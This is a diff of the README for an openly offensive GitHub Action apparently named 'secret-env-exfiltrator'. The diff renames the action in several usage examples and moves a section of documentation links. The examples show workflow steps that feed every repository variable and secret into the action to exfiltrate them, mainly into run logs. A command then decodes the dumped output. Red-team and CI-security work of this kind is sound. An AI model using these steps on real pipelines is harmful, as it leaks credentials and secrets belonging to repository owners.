@@ -2,11 +2,6 @@
 
 ![Logo](resources/logo.jpg)
 
-## Background
-
-All the contexts: https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs
-Printing context to logs: https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs#about-contexts
-
 ## Usage
 
 ### Exfil to GitHub Action logs (default behaviour)
@@ -19,7 +14,7 @@ jobs:
     runs-on: ubuntu-latest
     name: This will exfil secrets
     steps:
-      - uses: offensive-actions/exfiltrator@main
+      - uses: offensive-actions/secret-env-exfiltrator@main
         with:
           vars: ${{ toJSON(vars) }}
           secrets: ${{ toJSON(secrets) }}
@@ -35,7 +30,7 @@ jobs:
     runs-on: ubuntu-latest
     name: This will exfil secrets
     steps:
-      - uses: offensive-actions/exfiltrator@main
+      - uses: offensive-actions/secret-env-exfiltrator@main
         with:
           vars: ${{ toJSON(vars) }}
           secrets: ${{ toJSON(secrets) }}
@@ -59,7 +54,7 @@ jobs:
     runs-on: ubuntu-latest
     name: This will exfil secrets
     steps:
-      - uses: offensive-actions/exfiltrator@main
+      - uses: offensive-actions/secret-env-exfiltrator@main
         with:
           vars: ${{ toJSON(vars) }}
           secrets: ${{ toJSON(secrets) }}
@@ -92,6 +87,11 @@ echo <output> | base64 -d | rev | jq
 # show only the envvars that get a special treatment, since they are not in json format to begin with
 echo <output> | base64 -d | rev | jq -r '.[0].envvars' | base64 -d
 ```
+
+## Background
+
+All the contexts: https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs
+Printing context to logs: https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs#about-contexts
 
 ## Next steps
 
